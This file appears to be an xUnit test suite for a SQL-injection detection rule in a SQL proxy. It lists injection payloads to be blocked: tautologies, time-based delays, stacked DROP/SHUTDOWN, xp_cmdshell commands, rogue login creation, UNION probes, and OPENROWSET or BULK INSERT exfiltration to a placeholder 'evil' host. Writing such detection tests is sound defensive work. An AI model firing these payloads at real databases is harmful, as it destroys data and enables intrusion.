using FluentAssertions;
using Microsoft.Extensions.Logging.Abstractions;
using Microsoft.Extensions.Options;
using TailSqlProxy.Configuration;
using TailSqlProxy.Rules;
using Xunit;

namespace TailSqlProxy.Tests.Rules;

public class SqlInjectionRuleTests
{
    private readonly SqlInjectionRule _rule;
    private readonly SqlInjectionRule _ruleWithParseErrorBlock;

    public SqlInjectionRuleTests()
    {
        var options = Options.Create(new RuleOptions
        {
            SqlInjection = new SqlInjectionOptions { Enabled = true }
        });
        _rule = new SqlInjectionRule(options, NullLogger<SqlInjectionRule>.Instance);

        var optionsStrict = Options.Create(new RuleOptions
        {
            SqlInjection = new SqlInjectionOptions { Enabled = true, BlockOnParseErrors = true }
        });
        _ruleWithParseErrorBlock = new SqlInjectionRule(optionsStrict, NullLogger<SqlInjectionRule>.Instance);
    }

    private static QueryContext Ctx(string sql) => new() { SqlText = sql };

    private static QueryContext RpcCtx(string procName, string? sql = null) => new()
    {
        SqlText = sql ?? $"EXEC {procName}",
        ProcedureName = procName,
        IsRpc = true,
    };

    // =============================================
    // SHOULD BE BLOCKED — Tautology Attacks
    // =============================================

    [Theory]
    [InlineData("SELECT * FROM Users WHERE id = 1 OR 1=1")]
    [InlineData("SELECT * FROM Users WHERE name = 'admin' OR 1=1")]
    [InlineData("SELECT * FROM Users WHERE id = 5 OR 2=2")]
    public void Blocks_TautologyAttack_OrNEqualsN(string sql)
    {
        _rule.Evaluate(Ctx(sql)).IsBlocked.Should().BeTrue();
    }

    [Theory]
    [InlineData("SELECT * FROM Users WHERE name = '' OR ''=''")]
    [InlineData("SELECT * FROM Users WHERE name = 'x' OR 'a'='a'")]
    public void Blocks_TautologyAttack_OrStringEquals(string sql)
    {
        _rule.Evaluate(Ctx(sql)).IsBlocked.Should().BeTrue();
    }

    [Fact]
    public void Blocks_TautologyAttack_OrTrue()
    {
        _rule.Evaluate(Ctx("SELECT * FROM Users WHERE id = 1 OR true")).IsBlocked.Should().BeTrue();
    }

    // =============================================
    // SHOULD BE BLOCKED — Time-Based Blind Injection
    // =============================================

    [Theory]
    [InlineData("SELECT * FROM Users; WAITFOR DELAY '0:0:5'")]
    [InlineData("SELECT 1; WAITFOR DELAY '0:0:10'")]
    public void Blocks_TimeBased_WaitforDelay(string sql)
    {
        _rule.Evaluate(Ctx(sql)).IsBlocked.Should().BeTrue();
    }

    [Fact]
    public void Blocks_TimeBased_WaitforTime()
    {
        _rule.Evaluate(Ctx("SELECT 1; WAITFOR TIME '23:59:59'")).IsBlocked.Should().BeTrue();
    }

    [Fact]
    public void Blocks_TimeBased_Sleep()
    {
        _rule.Evaluate(Ctx("SELECT SLEEP(5)")).IsBlocked.Should().BeTrue();
    }

    [Fact]
    public void Blocks_TimeBased_Benchmark()
    {
        _rule.Evaluate(Ctx("SELECT BENCHMARK(10000000, SHA1('test'))")).IsBlocked.Should().BeTrue();
    }

    // =============================================
    // SHOULD BE BLOCKED — Stacked Query Injection
    // =============================================

    [Theory]
    [InlineData("SELECT 1; DROP TABLE Users")]
    [InlineData("SELECT * FROM Products; DROP DATABASE production")]
    [InlineData("SELECT 1; DROP VIEW vw_users")]
    [InlineData("SELECT 1; DROP PROCEDURE sp_getuser")]
    [InlineData("SELECT 1; DROP FUNCTION fn_calc")]
    [InlineData("SELECT 1; DROP INDEX ix_users ON Users")]
    public void Blocks_StackedQuery_Drop(string sql)
    {
        _rule.Evaluate(Ctx(sql)).IsBlocked.Should().BeTrue();
    }

    [Theory]
    [InlineData("SELECT 1; TRUNCATE TABLE Users")]
    public void Blocks_StackedQuery_Truncate(string sql)
    {
        _rule.Evaluate(Ctx(sql)).IsBlocked.Should().BeTrue();
    }

    [Fact]
    public void Blocks_StackedQuery_Shutdown()
    {
        _rule.Evaluate(Ctx("SELECT 1; SHUTDOWN")).IsBlocked.Should().BeTrue();
    }

    [Theory]
    [InlineData("; EXEC xp_cmdshell 'dir'")]
    [InlineData("; EXECUTE xp_cmdshell 'whoami'")]
    public void Blocks_StackedQuery_ExecXpCmdshell(string sql)
    {
        _rule.Evaluate(Ctx("SELECT 1" + sql)).IsBlocked.Should().BeTrue();
    }

    [Theory]
    [InlineData("; EXEC sp_OACreate 'Scripting.FileSystemObject'")]
    public void Blocks_StackedQuery_ExecSpOA(string sql)
    {
        _rule.Evaluate(Ctx("SELECT 1" + sql)).IsBlocked.Should().BeTrue();
    }

    [Theory]
    [InlineData("; ALTER TABLE Users ADD IsAdmin BIT")]
    [InlineData("; ALTER LOGIN sa ENABLE")]
    public void Blocks_StackedQuery_Alter(string sql)
    {
        _rule.Evaluate(Ctx("SELECT 1" + sql)).IsBlocked.Should().BeTrue();
    }

    [Theory]
    [InlineData("; CREATE LOGIN hacker WITH PASSWORD = 'p@ss'")]
    [InlineData("; CREATE USER hacker FOR LOGIN hacker")]
    public void Blocks_StackedQuery_CreateLoginUser(string sql)
    {
        _rule.Evaluate(Ctx("SELECT 1" + sql)).IsBlocked.Should().BeTrue();
    }

    // =============================================
    // SHOULD BE BLOCKED — UNION-Based Injection
    // =============================================

    [Theory]
    [InlineData("SELECT id, name FROM Users UNION SELECT NULL, NULL")]
    [InlineData("SELECT id, name FROM Users UNION SELECT 1, 2")]
    [InlineData("SELECT id FROM Users UNION ALL SELECT 1")]
    public void Blocks_UnionInjection_LiteralsOrNulls(string sql)
    {
        _rule.Evaluate(Ctx(sql)).IsBlocked.Should().BeTrue();
    }

    [Fact]
    public void Blocks_UnionInjection_SelectNull_Regex()
    {
        _rule.Evaluate(Ctx("' UNION SELECT NULL--")).IsBlocked.Should().BeTrue();
    }

    // =============================================
    // SHOULD BE BLOCKED — Dangerous Procedure Calls
    // =============================================

    [Theory]
    [InlineData("xp_cmdshell")]
    [InlineData("xp_regread")]
    [InlineData("xp_regwrite")]
    [InlineData("xp_dirtree")]
    [InlineData("xp_fileexist")]
    [InlineData("sp_OACreate")]
    [InlineData("sp_OAMethod")]
    [InlineData("sp_addlogin")]
    [InlineData("sp_addsrvrolemember")]
    [InlineData("sp_configure")]
    public void Blocks_DangerousProcedure_ViaRpc(string proc)
    {
        _rule.Evaluate(RpcCtx(proc)).IsBlocked.Should().BeTrue();
    }

    [Theory]
    [InlineData("EXEC xp_cmdshell 'dir'")]
    [InlineData("EXECUTE xp_cmdshell 'whoami'")]
    [InlineData("EXEC sp_OACreate 'WScript.Shell'")]
    [InlineData("EXEC sp_configure 'show advanced options', 1")]
    public void Blocks_DangerousProcedure_ViaSqlText(string sql)
    {
        _rule.Evaluate(Ctx(sql)).IsBlocked.Should().BeTrue();
    }

    // =============================================
    // SHOULD BE BLOCKED — Comment-Based Evasion
    // =============================================

    [Theory]
    [InlineData("SELECT/**/ * FROM Users; /* comment */ DROP TABLE Users")]
    [InlineData("/**/ UNION SELECT 1,2,3")]
    public void Blocks_CommentEvasion(string sql)
    {
        _rule.Evaluate(Ctx(sql)).IsBlocked.Should().BeTrue();
    }

    // =============================================
    // SHOULD BE BLOCKED — Information Probing
    // =============================================

    [Theory]
    [InlineData("SELECT @@version")]
    [InlineData("SELECT user_name()")]
    [InlineData("SELECT system_user")]
    public void Blocks_InformationProbing(string sql)
    {
        _rule.Evaluate(Ctx(sql)).IsBlocked.Should().BeTrue();
    }

    [Theory]
    [InlineData("SELECT * FROM sysobjects WHERE xtype='U'")]
    [InlineData("SELECT * FROM syscolumns")]
    public void Blocks_SchemaProbing(string sql)
    {
        _rule.Evaluate(Ctx(sql)).IsBlocked.Should().BeTrue();
    }

    // =============================================
    // SHOULD BE BLOCKED — Error-Based Injection
    // =============================================

    [Fact]
    public void Blocks_ErrorBased_ConvertVersion()
    {
        _rule.Evaluate(Ctx("SELECT CONVERT(int, @@version)")).IsBlocked.Should().BeTrue();
    }

    [Fact]
    public void Blocks_ErrorBased_CastVariable()
    {
        _rule.Evaluate(Ctx("SELECT CAST(@@servername AS int)")).IsBlocked.Should().BeTrue();
    }

    // =============================================
    // SHOULD BE BLOCKED — Data Exfiltration
    // =============================================

    [Fact]
    public void Blocks_Openrowset()
    {
        _rule.Evaluate(Ctx("SELECT * FROM OPENROWSET('SQLNCLI', 'Server=evil;', 'SELECT 1')")).IsBlocked.Should().BeTrue();
    }

    [Fact]
    public void Blocks_Opendatasource()
    {
        _rule.Evaluate(Ctx("SELECT * FROM OPENDATASOURCE('SQLNCLI', 'Data Source=evil;')")).IsBlocked.Should().BeTrue();
    }

    [Fact]
    public void Blocks_BulkInsert()
    {
        _rule.Evaluate(Ctx("BULK INSERT Users FROM '\\\\evil\\share\\data.csv'")).IsBlocked.Should().BeTrue();
    }

    // =============================================
    // SHOULD BE BLOCKED — Hex Encoding
    // =============================================

    [Fact]
    public void Blocks_LongHexLiteral()
    {
        _rule.Evaluate(Ctx("SELECT 0x44524F50205441424C45")).IsBlocked.Should().BeTrue();
    }

    // =============================================
    // SHOULD BE BLOCKED — Parse Errors + Suspicious Content (strict mode)
    // =============================================

    [Theory]
    [InlineData("' ; DROP TABLE Users --")]
    [InlineData("1'; DROP TABLE accounts--")]
    public void Blocks_ParseErrors_WithSuspiciousContent_WhenStrictMode(string sql)
    {
        _ruleWithParseErrorBlock.Evaluate(Ctx(sql)).IsBlocked.Should().BeTrue();
    }

    // =============================================
    // SHOULD BE ALLOWED — Legitimate Queries
    // =============================================

    [Theory]
    [InlineData("SELECT * FROM Users WHERE id = 1")]
    [InlineData("SELECT * FROM Users WHERE name = 'John'")]
    [InlineData("SELECT id, name FROM Users WHERE active = 1")]
    [InlineData("SELECT TOP 10 * FROM Orders")]
    [InlineData("INSERT INTO Users (name, email) VALUES ('Alice', 'alice@example.com')")]
    [InlineData("UPDATE Users SET name = 'Bob' WHERE id = 5")]
    [InlineData("DELETE FROM Users WHERE id = 99")]
    [InlineData("SELECT COUNT(*) FROM Orders")]
    [InlineData("SELECT u.name, o.total FROM Users u JOIN Orders o ON u.id = o.user_id")]
    public void Allows_LegitimateQueries(string sql)
    {
        _rule.Evaluate(Ctx(sql)).IsBlocked.Should().BeFalse();
    }

    [Theory]
    [InlineData("SELECT * FROM Users WHERE status = 1 OR status = 2")]
    [InlineData("SELECT * FROM Users WHERE role = 'admin' OR role = 'superadmin'")]
    public void Allows_LegitimateOrConditions(string sql)
    {
        _rule.Evaluate(Ctx(sql)).IsBlocked.Should().BeFalse();
    }

    [Fact]
    public void Allows_LegitimateUnion()
    {
        var sql = "SELECT id, name FROM Users UNION SELECT id, name FROM ArchivedUsers";
        _rule.Evaluate(Ctx(sql)).IsBlocked.Should().BeFalse();
    }

    [Theory]
    [InlineData("sp_executesql")]
    [InlineData("sp_prepexec")]
    [InlineData("sp_helpdb")]
    [InlineData("sp_help")]
    public void Allows_NonDangerousProcedures_ViaRpc(string proc)
    {
        _rule.Evaluate(RpcCtx(proc)).IsBlocked.Should().BeFalse();
    }

    [Theory]
    [InlineData("DROP TABLE TempTable")]
    [InlineData("TRUNCATE TABLE StagingData")]
    public void Allows_SingleStatement_Drop_Or_Truncate(string sql)
    {
        // Single DDL statement is legitimate admin operation, not stacked injection
        _rule.Evaluate(Ctx(sql)).IsBlocked.Should().BeFalse();
    }

    [Fact]
    public void Allows_LegitimateWaitfor()
    {
        // Single WAITFOR DELAY is legitimate (used in job scheduling)
        _rule.Evaluate(Ctx("WAITFOR DELAY '0:0:1'")).IsBlocked.Should().BeFalse();
    }

    // =============================================
    // SHOULD BE ALLOWED — Disabled Rule
    // =============================================

    [Fact]
    public void Disabled_DoesNotBlock()
    {
        var options = Options.Create(new RuleOptions
        {
            SqlInjection = new SqlInjectionOptions { Enabled = false }
        });
        var disabledRule = new SqlInjectionRule(options, NullLogger<SqlInjectionRule>.Instance);

        disabledRule.Evaluate(Ctx("SELECT * FROM Users WHERE id = 1 OR 1=1")).IsBlocked.Should().BeFalse();
    }

    // =============================================
    // Custom Patterns
    // =============================================

    [Fact]
    public void Blocks_CustomPattern()
    {
        var options = Options.Create(new RuleOptions
        {
            SqlInjection = new SqlInjectionOptions
            {
                Enabled = true,
                CustomPatterns = [@"(?i)\bDECLARE\s+@\w+\s+NVARCHAR.*\bEXEC\b"]
            }
        });
        var rule = new SqlInjectionRule(options, NullLogger<SqlInjectionRule>.Instance);

        var sql = "DECLARE @cmd NVARCHAR(4000); SET @cmd = 'DROP TABLE Users'; EXEC(@cmd)";
        rule.Evaluate(Ctx(sql)).IsBlocked.Should().BeTrue();
    }

    // =============================================
    // Empty / Null SQL
    // =============================================

    [Theory]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData(null)]
    public void Allows_EmptyOrWhitespace(string? sql)
    {
        _rule.Evaluate(new QueryContext { SqlText = sql ?? "" }).IsBlocked.Should().BeFalse();
    }
}
